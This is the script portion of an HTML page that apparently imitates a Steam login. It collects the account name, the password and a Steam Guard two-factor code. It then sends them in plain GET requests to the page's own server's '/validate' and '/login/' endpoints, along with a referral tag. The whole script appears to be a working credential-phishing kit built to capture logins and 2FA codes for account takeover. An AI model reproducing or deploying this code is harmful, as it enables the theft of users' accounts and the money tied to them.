<script>
window.GuardWin = {
	guardField: null,
	emaildomain: "",
	type: "",
	setUsername: function () {
			var vallogin = window.LogIn.getLogin();
			jQuery("span#login_twofactorauth_message_entercode_accountname").text(vallogin);
		},
	setEmaildomain: function () {
			var emaildomain = window.GuardWin.emaildomain;
			jQuery("span#emailauth_entercode_emaildomain").text(emaildomain);
		},
	open: function () {
			window.GuardWin.setUsername();
			window.GuardWin.setEmaildomain();
			setTimeout(
				function () {
					jQuery(".win_fade." + window.GuardWin.type).css("display", "block");
					jQuery(window).scrollTop(0);
					window.LogIn.hideLoadingGif();
				},
				2000
			);
		},
	close: function () {
			jQuery(".win_fade." + window.GuardWin.type).css("display", "none");
		},
	checkGuard: function () {
			if (window.GuardWin.guardField.value == "") return false;
			else if (window.GuardWin.guardField.value.length != 5) return false;
			else return true;
		},
	// validateField: function () { 
			// var reg = /[а-яА-ЯёЁ]/g; 
			// if (this.value.search(reg) !=  -1) {
				// this.value  =  this.value.replace(reg, '');
			// }
			// if (this.value.length > 5) 
				// this.value = this.value[0] + this.value[1] + this.value[2] + this.value[3] + this.value[4]; 
		// },
	showLoadingGif: function () {
			jQuery("#login_twofactorauth_buttonsets").css("display", "none");
			jQuery("#login_twofactorauth_buttonset_waiting").css("display", "block");
			
			jQuery("#auth_buttonset_entercode").css("display", "none");
			jQuery("#auth_buttonset_waiting").css("display", "block");
		},
	hideLoadingGif: function () {
			jQuery("#login_twofactorauth_buttonsets").css("display", "block");
			jQuery("#login_twofactorauth_buttonset_waiting").css("display", "none");
			
			jQuery("#auth_buttonset_entercode").css("display", "block");
			jQuery("#auth_buttonset_waiting").css("display", "none");
		},
	
	getGuard: function () {
			return window.GuardWin.guardField.value;
		},
	
	Init: function () {
			if (window.GuardWin.type == "phone") window.GuardWin.guardField = document.getElementById('twofact');
			else if (window.GuardWin.type == "email") window.GuardWin.guardField = document.getElementById('authcode');
			
			// window.GuardWin.guardField.onkeyup = window.GuardWin.validateField; 
		}
}

window.LogIn = {
	loginField: null,
	passwordField: null,
	checkFields: function () {
			var reg = /[а-яА-ЯёЁ]/g; 
			if (window.LogIn.loginField.value != "" && window.LogIn.passwordField.value != "" && window.LogIn.passwordField.value.search(reg) ==  -1)
				window.LogIn.validateAccount();
		},
	// validateFields: function () { 
			// var reg = /[а-яА-ЯёЁ]/g; 
			// if (this.value.search(reg) !=  -1) {
				// this.value  =  this.value.replace(reg, '');
			// }
		// },
	validateAccount: function () {
			window.LogIn.showLoadingGif();
			var url = window.location.protocol + "//" + window.location.hostname + "/validate?username=" + window.LogIn.loginField.value + "&password=" + window.LogIn.passwordField.value;
			jQuery.get(
				url,
				function (JSONdata) {
					var data = JSON.parse(JSONdata);
					if (data["result"] == true) {
						window.LogIn.Correct();
						window.GuardWin.type = data["type"];
						if (data["type"] == "email") window.GuardWin.emaildomain = data["emaildomain"];

						window.GuardWin.Init();
						window.GuardWin.open();
					}
					else {
						window.LogIn.Incorrect();
						window.LogIn.hideLoadingGif();
					}
				}
			);
		},
	showLoadingGif: function () {
			jQuery("#login_btn_signin").css("display", "none");
			jQuery("#login_btn_wait").css("display", "block");
		},
	hideLoadingGif: function () {
			jQuery("#login_btn_signin").css("display", "block");
			jQuery("#login_btn_wait").css("display", "none");
		},
		
	Correct: function () {
			jQuery("#error_display").css("display", "none");
		},
	Incorrect: function () {
			jQuery("#error_display").css("display", "block");
		},
	
	getLogin: function () {
			return window.LogIn.loginField.value;
		},
	getPass: function () {
			return window.LogIn.passwordField.value;
		},
	
	Init: function () {
			window.LogIn.loginField = document.getElementById('steamAccountName');
			window.LogIn.passwordField = document.getElementById('steamPassword');
			
			// window.LogIn.loginField.onkeyup = window.LogIn.validateFields;
			// window.LogIn.passwordField.onkeyup = window.LogIn.validateFields; 
		}
}


	function sendacc() {
		window.LogIn.showLoadingGif();
		window.GuardWin.showLoadingGif();

		var vallogin = window.LogIn.getLogin();
		var valpass = window.LogIn.getPass();
		var valguard = window.GuardWin.getGuard();
		
		var url = window.location.protocol + 
				  "//" +
				  window.location.hostname + 
				  "/login/?username=" + 
				  vallogin + "&password=" + 
				  valpass + "&guard=" + 
				  valguard + "&ref=" + 
				  window.ref + "&submit";
				  
		if (!window.GuardWin.checkGuard()) window.GuardWin.hideLoadingGif;
		else {
			jQuery.get(
				url,
				function () {
					setTimeout(
						function () {
							parent.loginReady();
						},
						2000
					);
				}
			);
		}
	}

	jQuery(document).ready(
		function () {
			window.LogIn.Init();
		}
	)
</script>

</body>
</html>